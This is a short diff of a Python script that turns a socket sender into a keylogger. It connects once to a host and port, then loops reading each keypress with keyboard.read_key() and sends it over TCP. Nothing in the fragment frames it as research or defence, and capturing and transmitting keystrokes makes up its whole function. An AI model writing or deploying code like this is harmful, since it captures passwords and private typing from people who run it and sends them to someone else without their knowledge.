@@ -23,12 +23,11 @@ local_EP = (hip, port)
 try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
     try:
+        s.connect(local_EP)
         while True:
-            s.connect(local_EP)
-            s.send(message.encode("utf-8"))
+            msg = keyboard.read_key()
+            s.send(msg.encode("utf-8"))
             print(msg)
-        #     key = keyboard.read_key()
-        #     a = 0
     except NameError:
         print(NameError)
         s.close()
